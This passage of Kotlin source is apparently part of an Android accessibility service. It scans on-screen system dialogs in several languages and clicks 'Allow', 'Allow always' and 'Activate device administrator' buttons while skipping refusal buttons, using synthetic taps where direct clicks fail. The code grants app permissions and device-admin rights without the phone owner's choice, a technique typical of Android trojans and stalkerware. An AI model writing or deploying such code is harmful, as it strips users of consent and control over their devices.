        }
        return score
    }

    private fun clickInRoot(
        service: AccessibilityService,
        root: AccessibilityNodeInfo,
        viewIds: List<String>,
        labels: List<String>,
        preferButton: Boolean,
    ): Boolean {
        for (viewId in viewIds) {
            val nodes = root.findAccessibilityNodeInfosByViewId(viewId) ?: continue
            try {
                for (node in nodes) {
                    try {
                        if (isNegativeNode(node)) {
                            continue
                        }
                        if (!node.isEnabled) {
                            continue
                        }
                        if (clickNode(service, node)) {
                            Log.i(TAG, "clicked viewId=$viewId")
                            return true
                        }
                    } finally {
                        node.recycle()
                    }
                }
            } finally {
                nodes.clear()
            }
        }
        for (label in labels) {
            val nodes = root.findAccessibilityNodeInfosByText(label) ?: continue
            try {
                val ranked = nodes.sortedByDescending { scoreLabelNode(it, label, preferButton) }
                for (node in ranked) {
                    try {
                        if (!isPositiveCandidate(node, label)) {
                            continue
                        }
                        if (preferButton && !isButtonLike(node) && scoreLabelNode(node, label, true) < 2) {
                            continue
                        }
                        if (clickNode(service, node)) {
                            Log.i(TAG, "clicked text=$label")
                            return true
                        }
                    } finally {
                        node.recycle()
                    }
                }
            } finally {
                nodes.clear()
            }
        }
        return false
    }

    private fun scoreLabelNode(node: AccessibilityNodeInfo, label: String, preferButton: Boolean): Int {
        var score = 0
        if (isButtonLike(node)) {
            score += 3
        }
        if (node.isClickable) {
            score += 2
        }
        val text = nodeLabel(node)
        if (text == label.lowercase(Locale.ROOT)) {
            score += 2
        }
        if (preferButton && text.contains("admin")) {
            score += 2
        }
        if (preferButton && (text.contains("设备管理") || text.contains("设备管理员") ||
                text.contains("admin perangkat") || text.contains("pengelola perangkat"))
        ) {
            score += 2
        }
        return score
    }

    private fun isButtonLike(node: AccessibilityNodeInfo): Boolean {
        val cls = node.className?.toString().orEmpty()
        if (cls.contains("Button", ignoreCase = true) || node.isClickable) {
            return true
        }
        val parent = node.parent ?: return false
        return try {
            val parentCls = parent.className?.toString().orEmpty()
            parentCls.contains("Button", ignoreCase = true) || parent.isClickable
        } finally {
            parent.recycle()
        }
    }

    private fun isNegativeNode(node: AccessibilityNodeInfo): Boolean {
        val text = nodeLabel(node)
        return (NEGATIVE_LABELS + runtimeNegatives).any { text.contains(it.lowercase(Locale.ROOT)) }
    }

    private fun isPositiveCandidate(node: AccessibilityNodeInfo, matchedLabel: String): Boolean {
        val text = nodeLabel(node)
        if (text.isBlank()) {
            return false
        }
        if ((NEGATIVE_LABELS + runtimeNegatives).any { text.contains(it.lowercase(Locale.ROOT)) }) {
            return false
        }
        val needle = matchedLabel.lowercase(Locale.ROOT)
        if (needle == "allow" || needle == "允许" || needle == "許可" || needle == "permitir" || needle == "izinkan" || needle == "ruxsat berish" || needle == "разрешить") {
            return text == needle ||
                text.startsWith("$needle ") ||
                text.endsWith(" $needle") ||
                text.contains("while using") ||
                text.contains("仅在使用") ||
                text.contains("始终允许") ||
                text.contains("常に許可") ||
                text.contains("mientras") ||
                text.contains("permitir siempre") ||
                text.contains("saat aplikasi") ||
                text.contains("saat menggunakan") ||
                text.contains("hanya kali ini") ||
                text.contains("sepanjang waktu") ||
                text.contains("selalu izinkan") ||
                text.contains("ilovadan foydalanish") ||
                text.contains("faqat shu safar") ||
                text.contains("har doim ruxsat") ||
                text.contains("doim ruxsat") ||
                text.contains("при использовании") ||
                text.contains("только в этот раз") ||
                text.contains("разрешить всегда")
        }
        if (needle == "activate" || needle == "激活" || needle == "启用" || needle == "activar" || needle == "aktifkan" || needle == "faollashtirish" || needle == "активировать") {
            return text == needle ||
                text.startsWith(needle) ||
                text.contains("device admin") ||
                text.contains("device administrator") ||
                text.contains("设备管理") ||
                text.contains("administrador del dispositivo") ||
                text.contains("admin perangkat") ||
                text.contains("pengelola perangkat") ||
                text.contains("qurilma administrator") ||
                text.contains("администратор устройства") ||
                text.contains("администратора устройства")
        }
        return text.contains(needle)
    }

    private fun nodeLabel(node: AccessibilityNodeInfo): String {
        return buildString {
            node.text?.let { append(it) }
            node.contentDescription?.let { append(' ').append(it) }
        }.lowercase(Locale.ROOT).trim()
    }

    private fun clickNode(service: AccessibilityService, node: AccessibilityNodeInfo): Boolean {
        var current: AccessibilityNodeInfo? = node
        var depth = 0
        while (current != null && depth < 8) {
            if (current.isEnabled) {
                // Realme/ColorOS：permission_allow_button 常是 clickable=false，仍要 ACTION_CLICK
                if (current.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                    if (current !== node) {
                        current.recycle()
                    }
                    return true
                }
                if (tapCenter(service, current)) {
                    if (current !== node) {
                        current.recycle()
                    }
                    return true
                }
            }
            val parent = current.parent
            if (current !== node) {
                current.recycle()
            }
            current = parent
            depth++
        }
        if (current != null && current !== node) {
            current.recycle()
        }
        return false
    }

    private fun tapCenter(service: AccessibilityService, node: AccessibilityNodeInfo): Boolean {
        val rect = Rect()
        node.getBoundsInScreen(rect)
        if (rect.width() < 8 || rect.height() < 8) {
            return false
        }
        val x = rect.exactCenterX()
        val y = rect.exactCenterY()
        val path = Path().apply { moveTo(x, y) }
        val gesture = GestureDescription.Builder()
            .addStroke(GestureDescription.StrokeDescription(path, 0, 50))
            .build()
        return runCatching {
            service.dispatchGesture(gesture, null, null)
        }.getOrDefault(false)
    }
}
